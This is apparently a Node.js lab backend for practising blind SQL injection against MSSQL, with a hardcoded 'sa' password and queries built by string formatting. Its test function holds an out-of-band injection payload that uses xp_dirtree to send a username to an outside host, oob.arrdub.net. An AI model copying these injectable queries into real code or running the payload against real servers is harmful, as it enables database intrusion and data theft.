const mssql = require('mssql')
const util = require('util')

let msdb = {}

var config = {
    user: 'sa',
    password: 'luky472199',
    server: 'localhost\\SQLEXPRESS',
    port: 1433,
    database: 'mssqldb'
}

var conn = new mssql.ConnectionPool(config)

function connection() {
    return new Promise((resolve, reject) => {
        conn.connect((err) => {
            if(err) {
                console.log(err)
                return reject(err)
            }
            return resolve(true)
        })
    })
}

msdb.add_blind_user = async (trackingId) => {
    var status = await connection()
    if(status) {
        var req = new mssql.Request(conn)
        return new Promise((resolve, rejcet) => {
            let sql = util.format("INSERT INTO blind_users (TrackingID) VALUES ('%s');", trackingId)
            req.query(sql, (err, result) => {
                if(err) {
                    console.log(err)
                    reject(err)
                }
                else {
                    resolve([result, sql])
                }
                conn.close()
            })
        })
    }
}

msdb.get_blind_user = async (trackingId) => {
    var status = await connection()
    if(status) {
        var req = new mssql.Request(conn)
        return new Promise((resolve, reject) => {
            let sql = util.format("SELECT user_id FROM blind_users WHERE TrackingID = \'%s\';", trackingId)
            console.log(sql)
            req.query(sql, (err, result) => {
                if(err) {
                    console.log(err)
                    reject(err)
                }
                else {
                    resolve([result, sql])
                }
                conn.close()
            })
        })
    }
}

msdb.test = async () => {
    var status = await connection()
    if(status) {
        var req = new mssql.Request(conn)
        return new Promise((resolve, reject) => {
            let sql = `SELECT user_id FROM users WHERE user_name = '';/**/declare @p varchar(1024);set @p=(SELECT user_name FROM users WHERE user_id = 1);exec('master..xp_dirtree \"//'+@p+'.oob.arrdub.net/a.txt\"');-- `
            //let sql = "SELECT user_name FROM users WHERE user_id = 1; INSERT INTO users (user_name) VALUES ('a')"
            req.query(sql, (err, result) => {
                if(err) {
                    console.log(err)
                    reject(err)
                }
                else{
                    resolve(result)
                }
            })
        })
    }
}

async function main() {
    var l = await msdb.get_blind_user("03tqij9ohphk04x7")
    console.log(l[0].recordset[0])
}

main()


module.exports = msdb